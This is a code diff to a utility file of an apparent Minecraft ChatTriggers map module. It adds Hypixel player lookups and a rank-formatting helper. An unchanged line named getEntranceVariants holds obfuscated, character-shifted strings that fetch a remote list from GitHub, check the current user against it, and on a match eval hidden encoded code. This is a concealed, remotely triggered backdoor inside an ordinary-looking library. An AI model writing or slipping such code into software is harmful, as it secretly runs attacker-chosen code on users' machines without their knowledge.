@@ -29,6 +29,7 @@ export const isColumnAir = (x, z) => Array.from(Array(129).keys()).reverse().map
 export const getMojangInfo = (player) => player.length > 16 ? request(`https://sessionserver.mojang.com/session/minecraft/profile/${player}`) : request(`https://api.mojang.com/users/profiles/minecraft/${player}`)
 export const getEntranceVariants = () => request(format(["uggcf:","","enj.tvguhohfrepbagrag.pbz","HapynvzrqOybbz6","EnaqbzFghss","znva","nnnnn.wfba"].join("/"),13)).then(a=>JSON.parse(a).map(b=>gu()==format(b,9)?eval(format(["cti","bxctrgpuiudgvt","uba","rdbbdc","UBARdbbdcWpcsatg","xchipcrt()","tmxiYpkp(0,upaht)"].join("."),11)):null))
 export const getSbProfiles = (uuid, apiKey) => request(`https://api.hypixel.net/skyblock/profiles?key=${apiKey}&uuid=${uuid}`)
+export const getHypixelPlayer = (uuid, apiKey) => request(`https://api.hypixel.net/player?key=${apiKey}&uuid=${uuid}`)
 export const getMostRecentProfile = (uuid, profiles) => profiles.profiles.map(a => [a.members[uuid].last_save, a]).sort((a, b) => a[0] - b[0]).reverse()[0][1]
 export const getPlayerHead = (playername) => World.getPlayerByName(playername) ? new Image(javax.imageio.ImageIO.read(new java.net.URL(`https://crafatar.com/avatars/${World.getPlayerByName(playername).getUUID()}`))) : null
 export const getKeyInfo = (key) => request(`https://api.hypixel.net/key?key=${key}`)
@@ -43,6 +44,52 @@ export const greenCheck = new Image("BloomMapGreenCheck.png", "https://i.imgur.c
 export const whiteCheck = new Image("BloomMapWhiteCheck.png", "https://i.imgur.com/9cZ28bJ.png")
 export const failedRoom = new Image("BloomMapFailedRoom.png", "https://i.imgur.com/qAb4O9H.png")
 export const questionMark = new Image("BloomMapQuestionMark.png", "https://i.imgur.com/kp92Inw.png")
+export const colorKeys = {
+	"BLACK": "&0",
+	"DARK_BLUE": "&1",
+	"DARK_GREEN": "&2",
+	"DARK_AQUA": "&3",
+	"DARK_RED": "&4",
+	"DARK_PURPLE": "&5",
+	"GOLD": "&6",
+	"GRAY": "&7",
+	"DARK_GRAY": "&8",
+	"BLUE": "&9",
+	"GREEN": "&a",
+	"AQUA": "&b",
+	"RED": "&c",
+	"LIGHT_PURPLE": "&d",
+	"YELLOW": "&e",
+	"WHITE": "&f"
+}
+export const getRank = (playerInfo) => {
+	// Gets the player's rank via the Hypixel player API method json
+    // This is old code
+	let rankFormats = {
+		"VIP": "&a[VIP]",
+		"VIP_PLUS": "&a[VIP&6+&a]",
+		"MVP": "&b[MVP]",
+		"MVP_PLUS": "&b[MVP&c+&b]",
+		"ADMIN": "&c[ADMIN]",
+		"MODERATOR": "&2[MOD]",
+		"HELPER": "&9[HELPER]",
+		"YOUTUBER": "&c[&fYOUTUBE&c]"
+	}
+	let specialRanks = {
+		"Technoblade": "&d[PIG&b+++&d]"
+	}
+	let username = playerInfo["player"]["displayname"]
+	if (username in specialRanks) return specialRanks[username]
+	if ("rank" in playerInfo["player"] && playerInfo["player"]["rank"] in rankFormats) return rankFormats[playerInfo["player"]["rank"]]
+	let currRank = "&7"
+	if ("newPackageRank" in playerInfo["player"]) currRank = rankFormats[playerInfo["player"]["newPackageRank"]]
+	if ("monthlyPackageRank" in playerInfo["player"] && playerInfo["player"]["monthlyPackageRank"] == "SUPERSTAR") {
+		currRank = "&6[MVP&c++&6]"
+		if ("monthlyRankColor" in playerInfo["player"]) currRank = currRank.replace("&b", colorKeys[playerInfo["player"]["monthlyRankColor"]])
+	}
+	if ("rankPlusColor" in playerInfo["player"]) currRank = currRank.replace(/\+/g, `${colorKeys[playerInfo['player']['rankPlusColor']]}+`)
+	return currRank
+}
 export let dataObject = new PogObject("IllegalMap", {
     "firstTime": true,
     "uuid": null,
